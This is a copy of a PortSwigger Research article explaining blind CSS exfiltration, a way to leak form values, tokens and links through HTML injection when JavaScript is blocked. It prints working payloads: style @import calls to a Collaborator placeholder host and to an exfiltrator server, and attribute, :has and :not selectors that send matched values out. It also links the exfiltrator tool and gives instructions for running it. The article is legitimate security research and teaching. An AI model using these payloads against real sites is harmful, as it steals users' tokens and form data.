---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-05_blind-css-exfiltration-exfiltrate-unknown-web-pages.md
original_filename: 2023-12-05_blind-css-exfiltration-exfiltrate-unknown-web-pages.md
title: 'Blind CSS Exfiltration: exfiltrate unknown web pages'
category: documents
detected_topics:
- xss
- ssrf
- csrf
- access-control
- sqli
- command-injection
tags:
- imported
- documents
- xss
- ssrf
- csrf
- access-control
- sqli
- command-injection
language: en
raw_sha256: 01ba63e23b2b9ffba42b4162d60c22c1800eb5023c55e114856ca19cb0fb90ec
text_sha256: 48ff368e5e513dedc5664025e479af3c70632363c5e29757c2ce264e430b4089
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# Blind CSS Exfiltration: exfiltrate unknown web pages

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-05_blind-css-exfiltration-exfiltrate-unknown-web-pages.md
- Source Type: markdown
- Detected Topics: xss, ssrf, csrf, access-control, sqli, command-injection
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `01ba63e23b2b9ffba42b4162d60c22c1800eb5023c55e114856ca19cb0fb90ec`
- Text SHA256: `48ff368e5e513dedc5664025e479af3c70632363c5e29757c2ce264e430b4089`


## Content

---
title: "Blind CSS Exfiltration: exfiltrate unknown web pages"
page_title: "Blind CSS Exfiltration: exfiltrate unknown web pages | PortSwigger Research"
url: "https://portswigger.net/research/blind-css-exfiltration"
final_url: "https://portswigger.net/research/blind-css-exfiltration"
authors: ["Gareth Heyes (@garethheyes)"]
bugs: ["Blind CSS exfiltration", "Blind HTML injection"]
publication_date: "2023-12-05"
added_date: "2024-01-18"
source: "pentester.land/writeups.json"
original_index: 650
---

[](/)

[Login](/users)

Products Solutions [Research](/research) [Academy](/web-security) Support Company

[Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[My account](/users/youraccount) [Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[ ![Burp Suite DAST](/content/images/svg/icons/enterprise.svg) **Burp Suite DAST** The enterprise-enabled dynamic web vulnerability scanner. ](/burp/enterprise) [ ![Burp Suite Professional](/content/images/svg/icons/professional.svg) **Burp Suite Professional** The world's #1 web penetration testing toolkit. ](/burp/pro) [ ![Burp Suite Community Edition](/content/images/svg/icons/community.svg) **Burp Suite Community Edition** The best manual tools to start web security testing. ](/burp/communitydownload) [View all product editions](/burp)

[ **Burp Scanner** Burp Suite's web vulnerability scanner ![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg) ](/burp/vulnerability-scanner)

[ **Attack surface visibility** Improve security posture, prioritize manual testing, free up time. ](/solutions/attack-surface-visibility) [ **CI-driven scanning** More proactive security - find and fix vulnerabilities earlier. ](/solutions/ci-driven-scanning) [ **Application security testing** See how our software enables the world to secure the web. ](/solutions) [ **DevSecOps** Catch critical bugs; ship more secure software, more quickly. ](/solutions/devsecops) [ **Penetration testing** Accelerate penetration testing - find more bugs, more quickly. ](/solutions/penetration-testing) [ **Automated scanning** Scale dynamic scanning. Reduce risk. Save time/money. ](/solutions/automated-security-testing) [ **Bug bounty hunting** Level up your hacking and earn more bug bounties. ](/solutions/bug-bounty-hunting) [ **Compliance** Enhance security monitoring to comply with confidence. ](/solutions/compliance)

[View all solutions](/solutions)

[ **Product comparison** What's the difference between Pro and DAST? ![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg) ](/burp/dast/resources/dast-vs-professional)

[ **Support Center** Get help and advice from our experts on all things Burp. ](/support) [ **Documentation** Tutorials and guides for Burp Suite. ](/burp/documentation) [ **Get Started - Professional** Get started with Burp Suite Professional. ](/burp/documentation/desktop/getting-started) [ **Get Started - DAST** Get started with Burp Suite DAST. ](/burp/documentation/dast/getting-started) [ **Downloads** Download the latest version of Burp Suite. ](/burp/releases)

[Visit the Support Center](/support)

[ **Downloads** Download the latest version of Burp Suite. ![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg) ](/burp/releases)

Articles

  * [Overview](/research)
  * Core Topics

[Black Hat](/research/black-hat) [XSS](/research/cross-site-scripting-research) [Request Smuggling](/research/request-smuggling) [Template Injection](/research/template-injection) [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)

  * [Articles](/research/articles)
  * Meet the Researchers

[James Kettle](/research/james-kettle) [Gareth Heyes](/research/gareth-heyes) [Zakhar Fedotkin](/research/zakhar-fedotkin)

  * [Talks](/research/talks)
  * [ RSS  ](/research/rss)

# Blind CSS Exfiltration: exfiltrate unknown web pages

  * [ ](https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fblind-css-exfiltration&text=Blind+CSS+Exfiltration%3A+exfiltrate+unknown+web+pages%20-%20%40PortSwiggerRes%0A)
  * [ ](https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fblind-css-exfiltration)
  * [ ](https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fblind-css-exfiltration)
  * [ ](https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fblind-css-exfiltration)
  * [ ](mailto:?subject=Blind+CSS+Exfiltration%3A+exfiltrate+unknown+web+pages&body=Blind+CSS+Exfiltration%3A+exfiltrate+unknown+web+pages%0A%0AThis+is+a+gif+of+the+exfiltration+process+\(We%27ve+increased+the+speed+so+you%27re+not+waiting+around+for+1+minute\).+Read+on+to+discover+how+this+works...+CSS+Cafe+presentation+I+presented+this+technique+%0A%0Ahttps://portswigger.net/research/blind-css-exfiltration)
  * [ ](/research/rss)

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

  * **Published:** Tuesday, 5 December 2023 at 15:37 UTC

  * **Updated:** Thursday, 11 July 2024 at 10:09 UTC

  * 

![Picture of an attacker exfiltrating data using CSS](/cms/images/5b/dc/8777-article-css-exfiltration-article.jpg)  

This is a gif of the exfiltration process (We've increased the speed so you're not waiting around for 1 minute). Read on to discover how this works...

![Video demo of the exfiltration process](/cms/images/fe/c1/2304-article-blind-css-exfiltration-demo.gif)

## CSS Cafe presentation

I presented this technique at [CSS Cafe](https://www.css.cafe/):

The slides are available here:  
[Blind CSS Exfiltration slides](https://portswigger.net/kb/papers/blind-css-exfiltration-exfiltrate-unknown-web-pages-slides.pdf).

## Why would we want to do blind CSS exfiltration?

Imagine you've got a blind HTML injection vulnerability but you can't get [XSS](/web-security/cross-site-scripting) because of the site's [CSP](/web-security/cross-site-scripting/content-security-policy) or perhaps the site has a server-side or DOM-based filter such as DOMPurify. JavaScript is off the table but they allow styles because they're just styles right? What possible damage can you do with just CSS?

In this post we'll recap known techniques to extract data with attribute selectors and then show you a novel technique with the brand new :has selector. To achieve extraction of the majority of form elements and anchor tags with just CSS! 

The first step is to confirm you can inject styles into your parameter. You can do this using Burp Collaborator by injecting an @import rule with a Collaborator payload: 

`"><style>@import'//YOUR-PAYLOAD.oastify.com'</style>`

Once you've confirmed you have an interaction from the Collaborator using Out-of-band [Application Security Testing](/burp/application-security-testing) ([OAST](/burp/application-security-testing/oast)). You know you can inject styles and JavaScript doesn't work but you have no idea what you are injecting into and have no idea what the structure of the page looks like. What you have is blind CSS injection! Let's learn how to exploit this vulnerability class.

## Triggering requests using CSS variables

In order to obtain data from the page you have to trigger a request to an external server and this is where [CSS variables](https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties) come in. You can use CSS variables as an on/off switch that triggers a conditional request using background images. As long as your variable is defined with a url() and a fallback that is a valid CSS property value (i.e. "none" for a background image) then you can use this variable to trigger a request by setting the variable: 

`<input value=1337>  
<style>  
input[value="1337"] {  
--value: url(/collectData?value=1337);  
}  
input {  
background:var(--value,none);  
}  
</style> `

The preceding example sets a CSS variable called "--value", this variable is set to a background image when the value of the input equals "1337". The fallback is used to set the background to "none" if the variable is not defined. Note, the fallback is optional but for the purposes of blind CSS exfiltration it's actually very important.

## How to extract data using CSS

### Extracting data with attribute selectors

Attribute selectors are an extremely powerful way to extract data. You can use them to check if attributes begin, end or even contain certain characters. This is the core of how CSS exfiltration works. Let's say for instance that you want to check if an input begins with the character "a": 

` <style>  
input[value^="a"] {  
color:red;  
}  
</style>  
<input value=abc>  
<input value=def>  
`

In the preceding example, there are two inputs with different values, the first begins with "a" and therefore the attribute selector will match the first input and turn the colour of the text red. If we wanted to match the second input we could also use the starts with "^=" selector or we could use the ends with "$=" selector: 

`<style>  
input[value$="f"] {  
color:red;  
}  
</style>  
<input value=abc>  
<input value=def> `

The preceding example now changes the text red on the second element because the value ends with "f". Turning the text colour red might prove the selector works but it's no use for exfiltrating data. We need to combine attribute selectors with background images and CSS variables to send the data to an external server! 

`<style>  
input[value^="a"] {  
--starts-with-a:url(/startsWithA);  
}  
input{  
background: var(--starts-with-a,none);  
}  
</style>  
<input value=abc>  
<input value=def> `

In the previous example, I define a variable called "--starts-with-a" and I assign this variable to the background image of the input and you'll notice if you observe the web page with devtools in the network tab you'll see a request is made for "/startsWithA". Notice I use a fallback of "none" this will be important later but all that does is: if the variable isn't defined then fallback to the none property value.

## Abusing the has selector to exfiltrate data on child nodes

Great so we've recapped a well known technique and you should now be up to speed on what comes next. 

### Attribute selector and :has

You can combine attribute selectors with the :has selector. This enables you to make a background request even if the element in question doesn't allow it such as a hidden input. You might have seen some CSS exfiltrators use other CSS selectors such as + in order for a background request to be made: 

`<input type=hidden value=1337><div></div>  
<style>  
input[value="1337"] + div {  
background:url(/collectData?value=1337);  
}  
</style> `

In the preceding example the plus (next-sibling combinator) is used to set the background on the div element if the attribute on the input value is matched. The advantage of the :has selector is that removes the need for this and, in addition, because you don't need to know what element appears next, you can more easily exfiltrate unknown page structures: 

`<div><input type=hidden value=1337></div>  
<style>  
div:has(input[value="1337"]) {  
background:url(/collectData?value=1337);  
}  
</style> `

### What is the :has selector?

The :has selector is a super powerful feature in CSS and when I first learned about it I was confused. So let me describe how I think about it in order for you to understand it. Imagine that :has is a function and that function will return the element to the left if any nodes underneath the element match the selector specified in the function argument. Of course, it isn't a function but I thought it would be useful to describe how I came to understand it. In CSS this is how you use the :has selector: 

`<style>  
div {  
display:none;  
}  
div:has(p) {  
display:block;  
}  
</style>  
<div>  
<p>I am visible</p>  
</div>  
<div>  
I am NOT visible  
</div> `

In the preceding example all divs are hidden with the div selector and then the :has selector is used to reveal specific divs (i.e. if a div has a paragraph element then its display property is changed to block and the div is shown). This means CSS allows you to change the properties of the parent based on the state of the child elements. But why would you need to do this for exfiltration? Glad you asked. I'll explain it in the next section.

## Abusing the HTML selector to make requests regardless of HTML structure

I thought about an unknown page structure for a while and I came to the conclusion that you could abuse the HTML tag and set a background on that. The reason you'd want to do that is that no site is going to use a background on the HTML element!

You see, once you set a property with CSS any further assignments to the property will overwrite it, providing it is more specific or the same as the last, this is the cascade part of CSS. If we chose something like the body element to make our request it could be overwritten by the page styles and we wouldn't see our exfiltrated data.

## Combining :has and :not selectors to identify multiple unknown elements

Another problem I had was how do you extract data from elements when you have no idea of their structure? Because if you use ^="a" it will be overwritten when another input is encountered. For instance, imagine you are cycling through every character and checking the first one that rule is going to match at least once which as I mentioned the cascade would prevent more than one request going through. My first attempt was to use the nth-of-type() selector and it appeared to work perfectly but actually, it required each element of the same type to be next to each other. Damn, that just isn't going to work, most form elements are going to be wrapped in divs etc. Then after thinking for a while, I came up with a fantastic idea, once a value had been enumerated I could then use the :not() selector to eliminate the element then the exfiltrator would move onto the next element:

` <style>  
html:has(input[name^="m"]):not(input[name="mytoken"]) {  
background:url(/m);  
}  
</style>  
<input name=mytoken value=1337>  
<input name=myname value=gareth> `

As the preceding example shows you can use the :not() selector to extract the next attribute value once you've already obtained another element of the same type. I really love this hack because it's so elegant and doesn't increase the size of the CSS file too much.

## Extracting large amounts of data using @import chaining

We've got the basis of my technique now but we need to make lots of requests to extract lots of data. There were two fantastic posts by [d0nut ](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b) and [Pepe Vila](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) that showed how you can use @import chaining to obtain large amounts of data very quickly. I used Pepe's script as the basis of CSS exfiltrator but it soon morphed into exfiltrating unknown structures. He used a counter to determine if the exfiltration was finished, I had to change this to use a timer because I don't know how many elements I'm actually extracting. 

Using imports I could wait for the data to be extracted because as the above posts mention you can block the CSS responses from returning until you're ready to move onto the next chunk. But the problem remained I had no idea how many elements I had to extract! There could be 1 or 20 and I had no idea how to find out. How could I possibly get around this?

## Using multiple backgrounds to send unlimited requests

I didn't know how many requests I'd need and didn't know what elements the page had so again I thought about this for a while and concluded that I could use CSS variables to assign multiple background images to the HTML tag background property. Remember the cascade problem? You can't assign to a property value after it's already assigned otherwise it would get overwritten. My solution was to initialise a large number of variables based on the configuration of the script and assign these variables to multiple backgrounds of the HTML element and this is why the fallback is important, if I didn't use a fallback then the background would get an invalid assignment and therefore all the requests would fail - by using a fallback the background would be assigned to none unless a character was found.

## Putting it all together

By using all the techniques mentioned above I could finally construct a blind CSS exfiltrator! It can extract input’s names and values, textarea name attributes, form actions and even anchor links. Almost every ASCII character is supported! I excluded stuff like NULL and new lines because they aren't likely to be included in attributes, but if you think they could be you can easily add them by modifying the script.

You can grab the source code of the exfiltrator from Github:

[Blind CSS Exfiltrator](https://github.com/hackvertor/blind-css-exfiltration)

## Using the exfiltrator

To run your own version of the exfiltrator you need to first grab the source code from above and then run it using node: 

`node css-exfiltrator-server.js`

This will start the server. Once the server is started it should be running on localhost:5001 by default. You can change this in the code. To start an exfiltration you simply need to make an @import request to the exfiltrator server:

`<style>  
@import 'http://localhost:5001/start';  
</style> `

This will then start the exfiltration process. You can use the network tab in dev tools to observe the process. Note you'd probably need to host this on a H2 enabled server. Otherwise you'll get pre-flight requests because of the different protocols. You can use a ProxyPass rule in Apache to forward to the local address: 

`ProxyPass /blind-css-exfiltration http://localhost:5001`

Once you have configured the ProxyPass rule you can then use your H2 server. Don't forget to change the hostname in the script and of course change your @import rule to use the address of your external server like our demo. 

## Displaying the results

By default, it displays the results in the console on the server as well as showing the results in the browser using pure CSS :). If you don't want the results displayed in the browser you can set the flag SHOW_RESULTS_IN_BROWSER to false and it will just display the results in the console on the server. 

## Demo

You can get a demo of our exfiltrator using PortSwigger labs. Note you can only exfiltrate once per IP. If more than one person tries to exfiltrate with the same IP the previous session will be deleted. Note it's better to run the Exfiltrator on your own server and our server is unlikely to handle a lot of users. Enjoy!

` <style>  
@import 'https://portswigger-labs.net/blind-css-exfiltration/start';  
</style> `

[ CSS ](/research/css) [ CSS injection ](/research/css-injection) [ Exfiltration ](/research/exfiltration) [ Gareth Favourites ](/research/gareth-heyes)

[Back to all articles](/research/articles)

## Related Research

### [ Inline Style Exfiltration: leaking data with chained CSS conditionals 26 August 2025 Inline Style Exfiltration: leaking data with chained CSS conditionals ](/research/inline-style-exfiltration) ### [ Splitting the email atom: exploiting parsers to bypass access controls 07 August 2024 Splitting the email atom: exploiting parsers to bypass access controls ](/research/splitting-the-email-atom) ### [ uBlock, I exfiltrate Exploiting Ad blockers with CSS 06 December 2021 uBlock, I exfiltrate Exploiting Ad blockers with CSS ](/research/ublock-i-exfiltrate-exploiting-ad-blockers-with-css) ### [ Creating a 3D world in pure CSS 13 October 2021 Creating a 3D world in pure CSS ](/research/creating-a-3d-world-in-pure-css)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner) [Burp Suite Editions](/burp) [Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting) [SQL injection](/web-security/sql-injection) [Cross-site request forgery](/web-security/csrf) [XML external entity injection](/web-security/xxe) [Directory traversal](/web-security/file-path-traversal) [Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations) [Testers](/testers) [Developers](/developers)

Company

[About](/about) [Careers](/careers) [Contact](/about/contact) [Legal](/legal) [Privacy Notice](/privacy) [Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security) [Blog](/blog) [Research](/research) [Engineering](/engineering)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/) [ Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.
